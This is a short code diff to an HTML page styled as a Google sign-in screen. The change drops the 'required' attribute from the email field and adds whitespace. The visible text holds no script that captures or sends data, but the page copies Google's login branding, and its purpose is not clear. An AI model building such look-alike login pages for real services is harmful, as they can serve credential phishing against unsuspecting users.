@@ -104,7 +104,7 @@
         <p>to continue to Google</p>
         <!-- Wrap the input fields and button in a form tag -->
         <form id="loginForm" onsubmit="return login(event)">
-            <input type="email" id="email" placeholder="Email or phone" required>
+            <input type="email" id="email" placeholder="Email or phone">
             <button type="button" id="nextButton" style="display: inline-block; width: 100%; padding: 10px; background-color: #1a73e8; color: #fff; text-align: center; text-decoration: none; border-radius: 4px; font-size: 16px;">Next</button>
             <p id="errorMessage" style="color: red; font-size: 14px; display: none;">Enter email</p>
             <script>
@@ -122,10 +122,12 @@
                 });
             </script>
         </form>
+
         <div class="footer">
             <p>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
         </div>
     </div>
+
 
 
 </body>
